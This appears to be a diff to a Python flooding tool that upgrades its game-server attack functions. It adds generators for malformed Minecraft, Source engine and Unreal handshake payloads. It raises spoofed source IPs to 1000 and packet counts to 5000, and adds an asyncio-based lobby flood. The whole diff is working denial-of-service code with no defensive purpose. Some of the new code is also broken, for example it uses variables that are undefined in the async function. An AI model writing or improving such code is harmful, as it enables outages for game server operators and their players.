@@ -20,6 +20,7 @@ import warnings
 import hashlib
 import shutil
 import base64
+import asyncio
 import string # Added for api_killer payload generation
 
 warnings.filterwarnings("ignore")
@@ -347,6 +348,22 @@ cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 Intn = random.randint
 Choice = random.choice
+
+def generate_minecraft_payload():
+    # Oversized handshake packet with invalid protocol version
+    protocol_version = random.randint(9999, 65535).to_bytes(2, 'big')
+    username = ''.join(random.choices(string.ascii_letters, k=random.randint(256, 512)))
+    payload = b"\x00" + protocol_version + bytes(username.encode()) + os.urandom(128)
+    return payload[:8192]
+
+def generate_source_payload():
+    # Mimics A2S_INFO query with corrupted data
+    base = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
+    return base + os.urandom(random.randint(64, 512))
+
+def generate_unreal_payload():
+    # Malformed Unreal join request
+    return b"\xFE\xFD\x09" + os.urandom(random.randint(128, 1024))
 
 def load_proxies():
     global proxies
@@ -1239,14 +1256,18 @@ def syn_strike(event, proxy_type, target_ip, target_port):
 
 def game_crash(event, proxy_type, target_ip, target_port):
     global proxies
+    common_game_ports = [25565, 27015, 7777, 19132]  # Minecraft, Source, Unreal, Bedrock
     payloads = [
-        b"\xFF\xFF\xFF\xFF" + os.urandom(32),
-        b"\x00\x00" + os.urandom(64),
-        b"\xFE\xFD" + os.urandom(16),
+        generate_minecraft_payload(),
+        generate_source_payload(),
+        generate_unreal_payload(),
+        b"\xFF\xFF\xFF\xFF" + os.urandom(random.randint(64, 8192)),
+        b"\x00\x00" + os.urandom(random.randint(64, 8192)),
+        b"\xFE\xFD" + os.urandom(random.randint(64, 8192)),
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(50)]
+    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
     event.wait()
-    while True:
+    while event.is_set():
         s = None
         try:
             proxy = Choice(proxies)
@@ -1259,46 +1280,61 @@ def game_crash(event, proxy_type, target_ip, target_port):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(2)
-            for _ in range(2000):
+            s.settimeout(1)  # Reduced timeout
+            target_port = target_port if target_port else random.choice(common_game_ports)
+            for _ in range(5000):  # Increased packet count
                 payload = Choice(payloads)
                 source_ip = Choice(spoofed_sources)
-                s.sendto(payload, (target_ip, target_port))
                 s.bind((source_ip, Intn(1024, 65535)))
+                s.sendto(payload, (target_ip, target_port))
+                time.sleep(0.001)  # Faster packet rate
             s.close()
         except:
             if s:
                 s.close()
+            time.sleep(0.05)
+
+async def async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources):
+    try:
+        for _ in range(5000):  # Increased connection count
+            payload = Choice(payloads)
+            source_ip = Choice(spoofed_sources)
+            s.bind((source_ip, Intn(1024, 65535)))
+            s.send(payload)
+            if random.random() < 0.2:  # Increased reconnect rate
+                s.close()
+                s = setup_socket(proxy_type, proxy)
+                s.connect((target_ip, target_port))
+            await asyncio.sleep(0.001)  # Async delay
+    except:
+        if s:
+            s.close()
 
 def lobby_flood(event, proxy_type, target_ip, target_port):
     global proxies
     payloads = [
-        b"\x01\x00" + os.urandom(16),
-        b"\x02\x00" + os.urandom(32),
-        b"\x00\x01" + os.urandom(64),
+        generate_minecraft_payload(),
+        generate_source_payload(),
+        b"\x01\x00" + os.urandom(random.randint(16, 256)),
+        b"\x02\x00" + os.urandom(random.randint(32, 512)),
+        b"\x00\x01" + os.urandom(random.randint(64, 1024)),
     ]
-    spoofed_sources = [spoof_source_ip() for _ in range(50)]
+    spoofed_sources = [spoof_source_ip() for _ in range(1000)]  # Increased spoofed IPs
     event.wait()
-    while True:
+    while event.is_set():
         s = None
         try:
             proxy = Choice(proxies)
             s = setup_socket(proxy_type, proxy)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.settimeout(2)  # Reduced timeout
             s.connect((target_ip, target_port))
-            for _ in range(2000):
-                payload = Choice(payloads)
-                source_ip = Choice(spoofed_sources)
-                s.bind((source_ip, Intn(1024, 65535)))
-                s.send(payload)
-                if random.random() < 0.05:
-                    s.close()
-                    s = setup_socket(proxy_type, proxy)
-                    s.connect((target_ip, target_port))
+            asyncio.run(async_lobby_flood(s, target_ip, target_port, payloads, spoofed_sources))
             s.close()
         except:
             if s:
                 s.close()
+            time.sleep(0.05)
 
 def discord(event, proxy_type, target_ip, target_port):
     global proxies
